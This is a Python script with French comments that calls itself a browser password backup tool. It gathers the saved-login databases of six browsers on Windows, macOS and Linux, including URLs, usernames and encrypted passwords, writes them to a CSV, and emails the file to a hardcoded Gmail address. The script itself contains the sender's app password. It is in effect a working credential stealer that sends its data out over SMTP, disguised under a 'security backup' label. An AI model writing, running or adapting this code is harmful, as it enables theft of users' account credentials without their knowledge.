import os
import shutil
import platform
import json
import sqlite3
import csv
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
#test
# ========================================================
# CONFIGURATION MISE À JOUR (SOLUTION AU BUG DNS)
# ========================================================
EMAIL_SENDER = "lupinarsene350@gmail.com"
EMAIL_PASSWORD = "lxsublzrbpopwigh"  
EMAIL_RECEIVER = "lupinarsene350@gmail.com"
SMTP_SERVER = "64.233.166.108"  # <--- REMPLACEZ "smtp.gmail.com" PAR CETTE ADRESSE IP DIRECTE
SMTP_PORT = 587


OS_TYPE = platform.system()

# Liste des chemins pour 6 navigateurs (Windows, Mac, Linux)
PATHS = {
    "Windows": {
        "Chrome": [os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")],
        "Brave": [os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")],
        "Firefox": [os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")],
        "Opera": [os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable")],
        "Vivaldi": [os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data")],
        "Edge": [os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")]
    },
    "Darwin": {  # macOS
        "Chrome": [os.path.expanduser("~/Library/Application Support/Google/Chrome")],
        "Brave": [os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser")],
        "Firefox": [os.path.expanduser("~/Library/Application Support/Firefox/Profiles")],
        "Opera": [os.path.expanduser("~/Library/Application Support/com.operasoftware.Opera")],
        "Vivaldi": [os.path.expanduser("~/Library/Application Support/Vivaldi")],
        "Edge": [os.path.expanduser("~/Library/Application Support/Microsoft Edge")]
    },
    "Linux": {
        "Chrome": [os.path.expanduser("~/.config/google-chrome"), os.path.expanduser("~/snap/chromium/common/chromium"), os.path.expanduser("~/.var/app/com.google.Chrome/config/google-chrome")],
        "Brave": [os.path.expanduser("~/.config/BraveSoftware/Brave-Browser"), os.path.expanduser("~/snap/brave/current/.config/BraveSoftware/Brave-Browser"), os.path.expanduser("~/.var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser")],
        "Firefox": [os.path.expanduser("~/.mozilla/firefox"), os.path.expanduser("~/snap/firefox/common/.mozilla/firefox")],
        "Opera": [os.path.expanduser("~/.config/opera"), os.path.expanduser("~/snap/opera/current/.config/opera"), os.path.expanduser("~/.var/app/com.opera.Opera/config/opera")],
        "Vivaldi": [os.path.expanduser("~/.config/vivaldi"), os.path.expanduser("~/.var/app/com.vivaldi.Vivaldi/config/vivaldi")],
        "Edge": [os.path.expanduser("~/.config/microsoft-edge"), os.path.expanduser("~/.var/app/com.microsoft.Edge/config/microsoft-edge")]
    }
}
#test 
def analyze_sqlite_logins(file_path):
    extracted_data = []
    try:
        temp_db = file_path + ".temp"
        shutil.copy2(file_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for origin_url, username_value, password_value in cursor.fetchall():
            if origin_url or username_value:
                if isinstance(password_value, bytes):
                    try:
                        encrypted_string = password_value.decode('utf-8', errors='replace')
                        encrypted_string = "".join(ch if ch.isprintable() else "?" for ch in encrypted_string)
                    except:
                        encrypted_string = password_value.hex()
                else:
                    encrypted_string = str(password_value)
                extracted_data.append({"url": origin_url, "login": username_value, "password_encrypted": encrypted_string})
        conn.close()
        os.remove(temp_db)
    except:
        pass
    return extracted_data

def send_email_with_attachment(file_path):
    print("[*] Connexion aux serveurs de Google et envoi du mail...")
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = f"Sauvegarde automatique de sécurité Mots de Passe - {datetime.now().strftime('%d/%m/%Y %H:%M')}"

        body = "Bonjour,\n\nVeuillez trouver ci-joint le tableau Excel généré automatiquement contenant votre sauvegarde de mots de passe chiffrés."
        msg.attach(MIMEText(body, 'plain'))

        filename = os.path.basename(file_path)
        with open(file_path, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename= {filename}")
            msg.attach(part)
#testrg
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, text)
        server.quit()
        print("[📩 EMAIL] Succès ! Le fichier Excel a bien été envoyé à lupinarsene350@gmail.com.")
    except Exception as e:
        print(f"[X] L'envoi de l'email a échoué. Erreur : {e}")

def backup_all_browsers():
    if OS_TYPE not in PATHS:
        print(f"[-] OS non supporté : {OS_TYPE}")
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_root = os.path.join(os.getcwd(), f"Sauvegarde_{timestamp}")
    os.makedirs(backup_root, exist_ok=True)
    all_logins_table = []

    for browser, base_paths in PATHS[OS_TYPE].items():
        for base_path in base_paths:
            if not os.path.exists(base_path):
                continue
            if browser in ["Chrome", "Brave", "Opera", "Vivaldi", "Edge"]:
                possible_subdirs = [".", "Default"]
                try:
                    for item in os.listdir(base_path):
                        if item.startswith("Profile "): possible_subdirs.append(item)
                except: pass
                for subdir in possible_subdirs:
                    login_data_path = os.path.join(base_path, subdir, "Login Data")
                    if os.path.exists(login_data_path):
                        data = analyze_sqlite_logins(login_data_path)
                        for entry in data:
                            all_logins_table.append([browser, entry["url"], entry["login"], entry["password_encrypted"]])
            elif browser == "Firefox":
                try:
                    for item in os.listdir(base_path):
                        profile_path = os.path.join(base_path, item)
                        if os.path.isdir(profile_path) and item != "Pending Pings":
                            logins_json = os.path.join(profile_path, "logins.json")
                            if os.path.exists(logins_json):
                                all_logins_table.append([browser, "Profil Firefox", f"Dossier: {item}", "[Sauvegardé séparément]"])
                                shutil.copy2(logins_json, os.path.join(backup_root, f"firefox_{item}_logins.json"))
                except: pass

    csv_path = os.path.join(backup_root, "base_mots_de_passe_chiffree.csv")
    try:
        with open(csv_path, mode="w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f, delimiter=";")
            writer.writerow(["Navigateur", "Site Web (URL)", "Identifiant / Email", "Mot de passe brute (Chiffré)"])
            writer.writerows(all_logins_table)
        print(f"[+] Tableau Excel local créé avec succès dans le dossier.")
        
        # Envoi automatique par mail
        send_email_with_attachment(csv_path)

    except Exception as e:
        print(f"[-] Erreur : {e}")

if __name__ == "__main__":
    backup_all_browsers()

